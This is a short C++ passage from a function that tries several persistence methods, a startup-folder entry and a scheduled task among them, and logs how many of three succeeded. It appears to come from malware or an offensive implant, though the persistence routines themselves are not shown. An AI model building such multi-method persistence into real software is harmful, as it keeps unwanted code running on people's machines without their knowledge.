    if (AddStartupFolderPersistence())
        successCount++;
    
    // Method 3: Scheduled task
    if (AddScheduledTaskPersistence())
        successCount++;
    
    LogActivity("============================================");
    LogActivity("[PERSISTENCE] " + std::to_string(successCount) + "/3 methods established");
    LogActivity("============================================");
    
    return successCount > 0;
}